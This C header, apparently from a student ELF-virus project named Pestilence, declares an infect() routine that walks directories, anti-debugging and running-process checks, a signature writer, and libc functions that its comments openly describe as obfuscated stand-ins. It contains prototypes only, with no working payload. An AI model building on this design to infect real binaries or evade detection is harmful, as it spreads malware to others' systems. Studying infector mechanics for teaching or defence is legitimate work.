/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.h                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: yyyyyy <yyyyyy@42.fr>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/08/01 17:16:00 by yyyyyy            #+#    #+#             */
/*   Updated: 2026/03/02 15:36:29 by yyyyyy           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef PESTILENCE_H
#define PESTILENCE_H

#include <elf.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "libasm.h"

#define ElfW(type)	   Elf64_##type
#define FORMAT		   2
#define PATH_MAX	   4096
#define SIGNATURE_SIZE 43
#define FORK_SIZE	   29
#define MACHINE_SIZE   0x8f1
#define JMPABLE_SIZE   4

/********************************* STRUCTURES *********************************/

typedef enum e_stat
{
	OK,
	KO,
} t_stat;

struct linux_dirent64
{
	uint64_t	   d_ino;	 /* 64-bit inode number */
	int64_t		   d_off;	 /* 64-bit offset to the next dirent */
	unsigned short d_reclen; /* Length of this `linux_dirent64` */
	unsigned char  d_type;	 /* File type */
	char		   d_name[]; /* Filename (null-terminated) */
};

typedef struct s_elf
{
	ElfW(Ehdr) * header;
	ElfW(Shdr) * sections;
	ElfW(Shdr) * text_section;
	ElfW(Phdr) * segments;
	ElfW(Phdr) * executed_segment;
	t_stat stat;
} t_elf;

/********************************* PROTOTYPES *********************************/

/*
void clean(t_file file);
*/
static void infect(char *path, void *begin_ptr);
static void processDirectory(char *folder, void *begin_ptr);

static int is_program_running(const char *target);
static int is_debugged(void);
static void signature(char str[]);

/**
	@brief Obfuscated version of memcmp
*/
static int evaluateDriftSignature(const void *alphaSeed, const void *betaSeed,
								  size_t calibrationSpan);
/**
	@brief Obfuscated version of strncmp
*/
static int delay_calc(const char *timeout_ns, const char *timeout_ms,
					  unsigned n);
/**
	@brief Obfuscated version of strlen
*/
static int validate_environment(const char *env_u);
/**
	@brief Obfuscated version of strcmp
*/
static int delay_abs_calc(const char *s__, const char *s___);
/**
	@brief Obfuscated version of memcpy content
*/
static void *memcat(void *buffered, void *rest, unsigned n);
/**
	@brief Obfuscated version of strchr
*/
static char *memoff(const char *l, int I);
/**
	@brief Obfuscated version of memmove
*/
static void *cache_sync(void *cache_ptr, const void *sync_check,
						size_t sync_lvl);
/**
	@brief Obfuscated version of strcpy
*/
static char *core_shift(char *value, char *src);
/**
	@brief Obfuscated version of strcat
*/
static char *flow_align(char *f_flow, char *s_flow);
/**
	@brief Obfuscated version of bzero
*/
static void context_purge(void *s, unsigned n);
/**
	@brief Obfuscated version of atoi
*/
static int trace_depth(const char *str);
/**
	@brief Obfuscated version of putchar
*/
static void tty_putc(char c);
/**
	@brief Obfuscated version of putnbr
*/
static void fmt_u64_dec(unsigned long long elem);
/**
	@brief Obfuscated version of a function that juste write 0x and call
   addr_emit
*/
static void emit_hex(unsigned long long n);
/**
	@brief Obfuscated version of hexa putnbr
*/
static void addr_emit(unsigned long long b);

/**
	@brief Obfuscated version of ft_syscall
*/
static uint64_t rt_vector(uint64_t instr_tag, uint64_t heap_ctx,
						  uint64_t exec_state, uint64_t io_ctx,
						  uint64_t stack_ref, uint64_t guard_mask,
						  uint64_t jitter_seed);

static void *memcpy(void *dst, void *src, unsigned n);

#endif
